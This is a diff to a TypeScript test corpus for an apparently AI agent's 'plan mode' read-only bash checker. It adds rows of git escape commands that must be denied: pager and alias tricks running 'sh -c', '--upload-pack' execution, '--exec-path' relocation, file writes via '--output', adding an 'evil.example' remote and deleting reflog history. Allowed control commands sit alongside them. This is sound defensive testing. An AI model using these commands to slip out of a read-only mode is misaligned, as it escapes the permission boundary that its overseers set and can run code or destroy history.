@@ -138,6 +138,27 @@ const BYPASSES: readonly Row[] = [
 	{ id: "PM-43", cmd: "curl -sK evil.conf https://evil.example", why: "CR2-01: `-sK` bundles `-K` -- reads an attacker-authored curl config, reinstating every denied flag" },
 	{ id: "PM-44", cmd: "sort -uo overwritten.txt in.txt", why: "CR2-01: `-uo` bundles PM-29's `-o` -- writes a file" },
 	{ id: "PM-45", cmd: "curl -sopayload.sh https://evil.example/x", why: "CR2-01: an attached-value cluster with no separating space" },
+
+	// CR2-02 -- `git` escapes reachable from subcommands that ARE on the read-only
+	// set. Every one of these was ALLOWED by the predicate as it shipped after the
+	// CR-03 fix pass, and the execution proofs are in read-only.ts's own docstrings
+	// (git 2.54.0.windows.1): `git grep -O'sh -c "echo PAGER_RAN"' needle` printed
+	// PAGER_RAN; `git -c alias.st='!sh -c "echo ALIAS_RAN"' st` printed ALIAS_RAN;
+	// `git ls-remote --upload-pack='sh -c "echo UPLOADPACK_RAN; exit 1"' .` fed the
+	// command's stdout back into git ("bad line length character: UPLO");
+	// `git diff --output=<file>` and `git log --output=<file>` each created a file;
+	// `git remote add evil https://x` wrote the remote into .git/config.
+	{ id: "PM-46", cmd: "git grep -O'sh -c \"id\"' needle", why: "CR2-02: `git grep -O` runs its argument as a pager -- arbitrary execution from a subcommand on the READ-ONLY set" },
+	{ id: "PM-47", cmd: "git grep --open-files-in-pager='sh -c \"id\"' needle", why: "CR2-02: the long spelling of PM-46" },
+	{ id: "PM-48", cmd: "git grep -iO'sh -c \"id\"' needle", why: "CR2-02 x CR2-01: `-iO` bundles the pager flag; executed, it really does run the pager" },
+	{ id: "PM-49", cmd: "git --exec-path=/tmp/evil log", why: "CR2-02: a global option that relocates where git looks for its subcommands -- ALLOWED before this fix because it attaches its value with `=` and so starts with `-`" },
+	{ id: "PM-50", cmd: "git --config-env=core.pager=EVIL -p log", why: "CR2-02: sets a config value from the environment; same `=`-attached blind spot as PM-49" },
+	{ id: "PM-51", cmd: "git -c alias.st='!sh -c \"id\"' st", why: "CR2-02: `-c alias.*` is arbitrary execution -- denied before by ACCIDENT (the value read as the subcommand), denied now on purpose" },
+	{ id: "PM-52", cmd: "git ls-remote --upload-pack='sh -c \"id\"' .", why: "CR2-02: `--upload-pack` runs its argument locally when the remote is a local path" },
+	{ id: "PM-53", cmd: "git diff --output=/tmp/wrote.txt HEAD", why: "CR2-02: `--output` WRITES A FILE in read-only mode" },
+	{ id: "PM-54", cmd: "git log --output=/tmp/wrote.txt -1", why: "CR2-02: the same diff option reached through `git log`" },
+	{ id: "PM-55", cmd: "git remote add evil https://evil.example", why: "CR2-02: `remote` is on the read-only set for its LISTING form; `remote add` writes .git/config" },
+	{ id: "PM-56", cmd: "git reflog delete HEAD@{0}", why: "CR2-02: `reflog` is on the read-only set for its listing form; `reflog delete` destroys history" },
 ];
 
 /**
@@ -184,6 +205,17 @@ const ALLOWED: readonly Row[] = [
 	{ id: "PM-A27", cmd: "sort -un in.txt", why: "CR2-01 control: `sort` bundling without `-o` writes nothing" },
 	{ id: "PM-A28", cmd: "git branch -vv", why: "CR2-01 control: a bundled cluster of non-mutating `git branch` flags is still the listing form" },
 	{ id: "PM-A29", cmd: "tail -n20 README.md", why: "CR2-01 control: an attached-value short option on a verb with no rule at all" },
+
+	// CR2-02's OWN negative control. The global-option walk is an ALLOWLIST, so
+	// it can over-block the ordinary forms as easily as it blocks the escapes;
+	// these are the rows that say it does not.
+	{ id: "PM-A30", cmd: "git --no-pager log --oneline -5", why: "CR2-02 control: an allowlisted global option before the subcommand" },
+	{ id: "PM-A31", cmd: "git grep -n needle", why: "CR2-02 control: `git grep` WITHOUT a pager flag is the search plan mode exists to do" },
+	{ id: "PM-A32", cmd: "git remote -v", why: "CR2-02 control: the listing form `remote` is on the read-only set FOR" },
+	{ id: "PM-A33", cmd: "git remote show origin", why: "CR2-02 control: `remote show` reads" },
+	{ id: "PM-A34", cmd: "git reflog", why: "CR2-02 control: bare `reflog` is the listing form" },
+	{ id: "PM-A35", cmd: "git log -SFOO --oneline", why: "CR2-02 control: `-SFOO` is a pickaxe search whose cluster contains an `O` -- matching `-O` across the whole argv instead of only under `grep` would deny it" },
+	{ id: "PM-A36", cmd: "git log --output-indicator-new=x -1", why: "CR2-02 control: a long option that merely STARTS with `--output` is not `--output`" },
 ];
 
 /** The six review bypasses, pinned by id so the corpus cannot quietly lose them. */
@@ -205,6 +237,17 @@ const ITERATION_2_BYPASS_IDS = [
 	"PM-43",
 	"PM-44",
 	"PM-45",
+	"PM-46",
+	"PM-47",
+	"PM-48",
+	"PM-49",
+	"PM-50",
+	"PM-51",
+	"PM-52",
+	"PM-53",
+	"PM-54",
+	"PM-55",
+	"PM-56",
 ] as const;
 
 describe("CR-03 -- plan mode's read-only bash boundary is decided over an unbash AST", () => {
